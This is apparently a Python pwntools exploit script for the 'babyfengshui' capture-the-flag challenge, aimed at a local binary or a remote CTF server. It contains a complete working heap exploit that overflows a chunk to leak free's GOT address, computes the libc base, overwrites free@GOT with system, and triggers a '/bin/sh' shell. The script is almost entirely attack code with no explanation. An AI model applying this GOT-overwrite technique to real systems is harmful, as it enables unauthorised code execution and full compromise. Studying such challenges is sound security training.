from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyfengshui")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./babyfengshui")
else:
	p = remote("111.198.29.45","46825")
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
	elf = ELF("./babyfengshui")

def menu(choice):
	p.sendlineafter("Action: ",str(choice))

def add(size,content,textlen,text):
	menu(0)
	p.sendlineafter("size of description: ",str(size))
	p.sendlineafter("name: ",content)
	p.sendlineafter("text length: ",str(textlen))
	p.sendlineafter("text: ",text)

def free(index):
	menu(1)
	p.sendlineafter("index: ",str(index))

def show(index):
	menu(2)
	p.sendlineafter("index: ",str(index))

def edit(index,textlen,text):
	menu(3)
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("text length: ",str(textlen))
	p.sendafter("text: ",text)

def debugf():
	if debug:
		gdb.attach(p,"b *0x08048AC5")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
add(0x100,"aaaa",0x13,"b" * 0x10)
add(0x24,"aaaa",0x13,"b" * 0x10)
free(0)
payload = "/bin/sh\x00" + "b" * (0x1c0 - 0x10) + p32(elf.got["free"])
add(0x110,"/bin/sh\x00",0x1c4,payload)
show(1)
p.recvuntil("description: ")
leak_addr = u32(p.recv(4))
log.success("free_addr:" + hex(leak_addr))
libc.address = leak_addr - libc.symbols["free"]
log.success("libc_base:" + hex(libc.address))
edit(1,0x4,p32(libc.symbols["system"]))
free(2)
p.interactive()
